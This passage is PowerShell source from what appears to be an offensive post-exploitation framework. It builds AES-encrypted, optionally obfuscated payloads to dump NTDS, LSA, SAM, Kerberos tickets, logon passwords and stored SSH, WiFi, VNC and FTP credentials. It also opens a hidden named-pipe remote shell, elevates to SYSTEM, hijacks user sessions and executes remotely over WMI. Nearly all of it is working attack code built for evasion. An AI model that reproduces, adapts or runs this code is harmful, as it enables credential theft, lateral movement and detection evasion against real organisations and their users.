        "WinSCP"         = "WinSCP output will be written to $WinSCP"
    }

    # Check if the module message exists and display it
    if ($moduleMessages.ContainsKey($Module)) {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host $moduleMessages[$Module]
    
        if (!$ShowOutput) {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use -ShowOutput to display results in the console"
            Write-Host ""
        }
    }
    elseif ($Method -eq "GenRelayList") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "SMB Signing output will be written to $SMB"
    }
    ################################################################################################################
    ######################################## Command and Module logic ## ###########################################
    ################################################################################################################

    function Generate-RandomString {
        param(
            [int]$Length = 32
        )
        $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        $bytes = New-Object byte[] $Length
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $rng.GetBytes($bytes)
        $rng.Dispose()
        $string = ($bytes | ForEach-Object { $characters[$_ % $characters.Length] }) -join ''
        return $string
    }

    function obfuscation-arguments {

        if (-not ($Obfuscate)) { return $Command }

        $OldLength = $Command.Length

        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Obfuscating payload..."

        $Shuffle = @()
        if ($Obfuscate -like "*c*") { $Shuffle += 'c' }
        if ($Obfuscate -like "*g*") { $Shuffle += 'g' }
        if ($Obfuscate -like "*u*") { $Shuffle += 'u' }

        $ShuffledConditions = $Shuffle | Get-Random -Count $Shuffle.Count

        
        foreach ($Condition in $ShuffledConditions) {
            switch ($Condition) {
                'c' { $Command = Out-Compressed -StringInput $Command }            
                'g' { $Command = Out-Gzip -InputString $Command }
                'u' { $Command = Out-UUID -InputString $Command }
            }
        }

        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Payload obfucated  :"
    
        Write-Host "  " -ForegroundColor "Yellow" -NoNewline
        Write-host "Old payload length : $OldLength"
    
        Write-Host "  " -ForegroundColor "Yellow" -NoNewline
        Write-Host "New payload length : $($Command.Length)"

        Write-Host ""

        return $Command
    }


   

    # Amnesiac
    if ($Module -eq "Amnesiac") {

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Amnesiac PID: $Global:AmnesiacPID"

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "PipeName: $Global:PN"

        if ($Scramble) {

            Write-Host ""
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch Scramble is in use. Ensure Amnesiac is already running"

            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "In Amnesiac do ""GLset $Global:PN"" then hit option ""3"""

        }

        $SID = $Global:SID
        $ServerScript = "`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
        $b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

        # Change the command string if the Method is WinRM
        if ($Method -eq "WinRM") {
            $finalString = "powershell.exe -EncodedCommand ""$b64ServerScript"""
        }
        else {
            $finalString = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
            $finalString = $finalString -replace '"', "'"
        }

        if ($Elevate -and $Method -ne "SMB") {
            $Command = $finalString

            $ElevateKey = Generate-RandomString 32
            $ElevateIV = Generate-RandomString 16  
            $ElevateData = Invoke-AES -k $ElevateKey -iv $ElevateIV -t "$LocalElevate"

            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  
            $DataB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Data = Invoke-AES -k $Key -iv $IV -t "$DataB64"  
            $Command = "$Decrypt ; Invoke-Decrypt $ElevateKey $ElevateIV $ElevateData | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $Key $IV $Data) | Out-String"
            Start-Sleep -Seconds 2
        }
        else {
            $Command = $finalString
            Start-Sleep -Seconds 2
        }
    }

    elseif ($Method -eq "DCSync") {
    
        # Do nothing, handled in method-dcsync
        
    }

    # NTDS
    elseif ($Module -eq "NTDS") {
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-NTDS"
    }

    # LogonPasswords
    elseif ($Module -eq "LogonPasswords") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""dump"" ; Write-output ""`[SYSTEM]:`$env:computername"""
    }

    # eKeys
    elseif ($Module -eq "ekeys") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""ekeys"""
    }

    # LSA
    elseif ($Module -eq "lsa") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""lsa"""
    }

    # lsa-trust
    elseif ($Module -eq "lsa-trust") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""lsa-trust"""
    }

    # KerbDump
    elseif ($Module -eq "KerbDump") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16

        $Command = $LocalKerbDump
        $Command = obfuscation-arguments
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command

        if ($Option.Split(':')[1] -eq "Monitor") {
            try {
            
                $MonitorTime = [int]$Option.Split(':')[2]
                if (-not (1..240 -contains $MonitorTime)) {
                    throw ""
                }
            }
            catch {
            
                Write-Host "- " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Monitor value out of range (1..240) or invalid. Defaulting to 2 (Minutes)"
                $MonitorTime = 2
            }

            $WMI_Extend = $True
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos -Monitor $MonitorTime"
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Ticket monitoring has started. Please be patient for results to return to the console"
        }
        else {

            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos"

        }
    }



    # Session Relaying
    # must complete obfuscation for here at some point
    elseif ($Module -eq "SessionRelay") {

        # Phase One: Initial Encryption
        $keyPhaseOne = Generate-RandomString 32
        $ivPhaseOne = Generate-RandomString 16  
        $dataPhaseOne = Invoke-AES -k $keyPhaseOne -iv $ivPhaseOne -t "$LocalSessionRelay ; Invoke-SessionRelay -SessionID ""All"" -ListenerIP ""$ListenerIP"""      
        $Command = "$Decrypt ; Invoke-Decrypt $keyPhaseOne $ivPhaseOne $dataPhaseOne | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $keyPhaseOne $ivPhaseOne $dataPhaseOne) | Out-String"
    
        if ($Method -ne "SMB") {

            # Phase Two: Elevation Encryption
            $keyPhaseTwo = Generate-RandomString 32
            $ivPhaseTwo = Generate-RandomString 16  
            $dataPhaseTwo = Invoke-AES -k $keyPhaseTwo -iv $ivPhaseTwo -t "$LocalElevate"

            # Phase Three: Re-encrypt Command for RunAsSystem
            $keyPhaseThree = Generate-RandomString 32
            $ivPhaseThree = Generate-RandomString 16  
            $dataPhaseThreeB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$LocalSessionRelay ; Invoke-SessionRelay -SessionID ""All"" -ListenerIP ""$ListenerIP"""))
            $dataPhaseThree = Invoke-AES -k $keyPhaseThree -iv $ivPhaseThree -t "$dataPhaseThreeB64"        
            $Command = "$Decrypt ; Invoke-Decrypt $keyPhaseTwo $ivPhaseTwo $dataPhaseTwo | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $keyPhaseThree $ivPhaseThree $dataPhaseThree) | Out-String"
    
        }
    }



    # SessionExec
    elseif ($Module -eq "SessionExec") {
        $ShowOutput = $true

        # Phase One Encryption
        if ($Command -eq "") { $Command = "whoami" }
        else {}

        $Command = obfuscation-arguments
        
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16  
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX" 
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two Encryption
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $Command = obfuscation-arguments
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16  
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {
            
            # Phase Three Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16  
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"
            $Command = obfuscation-arguments

            # Phase Four Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16  
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    elseif ($Module -eq "TGTDeleg") {

        # Phase One: Initial Command Preparation
        $Command = @"
if ((`$domainName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[0]) -eq `$env:COMPUTERNAME) { return "[-] Local user account, skipping..." }
$rbs ; `$b = (invoke-rtickets send /nowrap) ; (`$b | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
"@
        $Command = obfuscation-arguments

        # Phase One Encryption
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX"
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two: Session Execution
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $Command = obfuscation-arguments
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {

            # Phase Three: Elevation Command Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            # Preparing Command for System Execution
            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"
            $Command = obfuscation-arguments

            # Phase Four: Final Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    elseif ($Module -eq "NTLM") {

        # Phase One: Initial Command Preparation
        $Command = "$NetNTLM"
        $Command = obfuscation-arguments

        # Phase One Encryption
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX"
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two: Session Execution
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {

            # Phase Three: Elevation Command Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            # Preparing Command for System Execution
            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"

            # Phase Four: Final Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    # SCCM
    elseif ($Module -eq "SCCM") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalSCCM
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX "
    }

    # SAM
    elseif ($Module -eq "SAM") {
  
        if ($Method -eq "WinRM") {

            $Command = Out-Compressed -StringInput "$LocalSam"
            $Base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Command = "powershell.exe -enc $Base64Command"

        }

        else {
            
            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  

            $Command = $LocalSam
            $Command = obfuscation-arguments
            
            $Data = Invoke-AES -k $Key -iv $IV -t $Command
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        
        }
    }

    # WinSCP
    elseif ($Module -eq "WinSCP") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalWinSCP
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # VNC Dump
    elseif ($Module -eq "VNC") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalVNC
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Filezilla Dump
    elseif ($Module -eq "FileZilla") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalFileZilla
        $Command = obfuscation-arguments
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Wifi
    elseif ($Module -eq "wifi") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalWifi
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # SSH
    elseif ($Module -eq "SSH") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalSSH
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Notepad
    elseif ($Module -eq "Notepad") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalNotepad
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # ConsoleHistory
    elseif ($Module -eq "ConsoleHistory") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $ConsoleHostHistory
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # VMCheck
    elseif ($Module -eq "VMCheck") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16 
        
        $Command = $LocalVMCheck
        $Command = obfuscation-arguments 
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        $Module = ""
    }

    # RunAsPPLCheck
    elseif ($Module -eq "RunAsPPL") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalPPLCheck
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        $Module = ""
    }

    # MDF
    elseif ($Module -eq "MDF") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $DumpMDF
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $DumpMDF
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-MDF"
    }


    # Files
    elseif ($Module -eq "Files") {

        $Command = $Files
        $Command = obfuscation-arguments
        $Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
        $Command = "powershell.exe -enc $Command"
    
    }

    # Command Execution
    elseif ($Module -eq "" -and $Command -ne "") {      
        
        if ($Elevate) {
            
            $ElevateKey = Generate-RandomString 32
            $ElevateIV = Generate-RandomString 16  
            $ElevateData = Invoke-AES -k $ElevateKey -iv $ElevateIV -t $LocalElevate

            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  
            
            $Command = obfuscation-arguments
            
            $DataB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Data = Invoke-AES -k $Key -iv $IV -t $DataB64  
            $Command = "$Decrypt ; Invoke-Decrypt $ElevateKey $ElevateIV $ElevateData | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $Key $IV $Data) | Out-String"
        
        }
        
        else {
        
            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16
            
            $Command = obfuscation-arguments  
            $Data = Invoke-AES -k $Key -iv $IV -t $Command
            $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        
        }
    }

    ################################################################################################################
    ################################# Logic to help keep output tidy and even ######################################
    ################################################################################################################

    # First conditional check
    if ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and !$IPAddress) {
        $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
        $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
    }

    # Second conditional check
    elseif ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and $IPAddress) {
        $NameLength = 16
        $OSLength = 0
    }

    ################################################################################################################
    ################################################ Function: WMI #################################################
    ################################################################################################################
    Function Method-WMI {
        param ($ComputerName)
        Write-host
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout, $MonitorTime, $WMI_Extend)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }


            Function WMI {
                param (
                    [string]$ComputerName,
                    [string]$Command,
                    [string]$Class = "Win32_" + -join ((65..90 + 97..122 + 48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }),
                    [switch]$LocalAuth,
                    [string]$Username,
                    [string]$Password
                )

                # Create PSCredential object if using local authentication
                if ($LocalAuth) {
                    $LocalUsername = "$ComputerName\$Username"
                    $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                }

                $WMIAccess = $null
                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

                if (!$WMIAccess) { return "Access Denied" } 
                elseif ($Command -eq "") { return "Successful Connection PME" }

                function Invoke-Class {
                    param (
                        [string]$ComputerName
                    )

                    if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                    else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }

                    if ($classCheck -eq $null) {
                        if ($LocalAuth) {
                            $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                            $scope.Connect()
                            $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                        }
                        else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }

                        $newClass["__CLASS"] = "$Class"
                        $newClass.Qualifiers.Add("Static", $true)
                        $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
                        $newClass.Properties["InstanceID"].Qualifiers.Add("Key", $true)
                        $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                        $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                        $newClass.Put() | Out-Null
                    }

                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                    else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }

                    $wmiInstance.GetType() | Out-Null
                    $wmiInstance.CommandToRun = "$Command"
                    $wmiInstance.Put() | Out-Null
                    $InstanceID = $wmiInstance.InstanceID
                    $wmiInstance.Dispose()
                    return $InstanceID
                }

                # Function to retrieve script output
                function GetScriptOutput {
                    param (
                        [string]$ComputerName,
                        [string]$InstanceID
                    )
                    try {
                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                        else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
            
                        $encodedResult = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        $resultBytes = [Convert]::FromBase64String($encodedResult)
                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                        return $result
                    }
                    catch {
                        return $_.Exception.Message
                    }
                    finally {
                        if ($wmiInstance) {
                            $wmiInstance.Dispose()
                        }
                    }
                }

                # Function to execute a command remotely
                function Invoke-Execution {
                    param (
                        [string]$ComputerName,
                        [string]$Command
                    )

                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      

                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                    else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }

                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            
                            if (-not $MonitorTime) { $MonitorTime = 2 } elseif ($MonitorTime -lt 2) { $MonitorTime = 2 }
                            if ($WMI_Extend) { $MonitorTime += 1 }

                            if ($started.AddMinutes($MonitorTime) -lt (Get-Date)) {
                                Write-Output "Timed Out"
                                break
                            }
    
                            if ($LocalAuth) { $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred }
                            else { $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" }
    
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
                        return $scriptOutput
                    }
                }

                $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                if ($scriptInstanceID -eq $null) { return "Error Creating Class" }

                $script = @"
`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
"@

                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand

                try {
                    Start-Sleep -Seconds 1

                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred -ErrorAction "Stop" | Out-Null }
                    else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -ErrorAction "Stop" | Out-Null }

                    $Cleanup = "Success"
                }
                Catch { $Cleanup = "Failure" }
                return @($result, $Cleanup, $Class)
            }




            If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
            else { WMI -ComputerName $ComputerName  -Command $Command }

        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout).AddArgument($MonitorTime).AddArgument($WMI_Extend)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
